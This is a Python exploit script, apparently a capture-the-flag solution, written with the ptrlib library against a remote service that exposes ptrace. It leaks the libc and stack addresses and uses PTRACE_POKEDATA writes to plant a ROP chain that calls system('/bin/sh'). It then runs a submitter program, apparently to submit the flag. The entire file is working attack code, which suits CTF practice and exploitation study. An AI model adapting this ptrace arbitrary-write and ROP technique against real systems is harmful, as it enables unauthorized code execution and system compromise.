import os
import time
from ptrlib import *

def ptrace(req, addr, data):
    sock.sendlineafter("?\n", hex(req))
    sock.sendlineafter("?\n", hex(addr))
    sock.sendlineafter("?\n", hex(data))
    return int(sock.recvlineafter("returned "), 16)

HOST = os.getenv('HOST', 'localhost')
PORT = 31337 #os.getenv('PORT', 31337)

libc = ELF("./libc.so.6")
#sock = Process("./challenge", cwd="handout")
sock = Socket(HOST, PORT)
stream = sock

PTRACE_PEEKDATA = 2
PTRACE_PEEKUSER = 3
PTRACE_POKEDATA = 5
PTRACE_GETREGS = 12
#leak = ptrace(PTRACE_PEEKDATA, 0x555555554000, 0)

def cont():
    sock.sendlineafter("?", "1")
def peek_user(offset):
    leaked = ptrace(PTRACE_PEEKUSER, offset, 0)
    cont()
    return leaked

def peek(addr):
    leaked = ptrace(PTRACE_PEEKDATA, addr, 0)
    cont()
    return leaked

"""
for i in range(100):
    data = peek_user(i)
    if data == 2**64-1: continue
    print(f'{i=} {hex(data)=}')
input("> ")
"""
    

libc.base = peek_user(64) - 0x232040
def aaw64(addr, data):
    ptrace(PTRACE_POKEDATA, addr, data)
    sock.sendlineafter("(0/1)?", "1")

print(hex(peek(libc.base)))

DIFF = 0x188

print(f'{hex(DIFF)=}')

addr_stack  =peek(libc.symbol('environ')) - DIFF
logger.info("stack = " + hex(addr_stack))

rop = [
    libc.base + 0x001bc022,
    libc.base + 0x001bc021,
    next(libc.find("/bin/sh")),
    libc.symbol("system")
]

for i, x in enumerate(rop):
    aaw64(addr_stack + i*8, x)

ptrace(-1, 0, 0)
sock.sendlineafter("?", "0")

print("gogo!")
time.sleep(0.5)
sock.sendline("/bin/ls")
time.sleep(0.5)
sock.sendline("./submitter")
time.sleep(0.5)
sock.sendline("./submitter")
time.sleep(0.5)
sock.sendline("./submitter")

while True:
    try:
        print(sock.recvline(timeout=1).decode())
    except TimeoutError:
        break

sock.close()
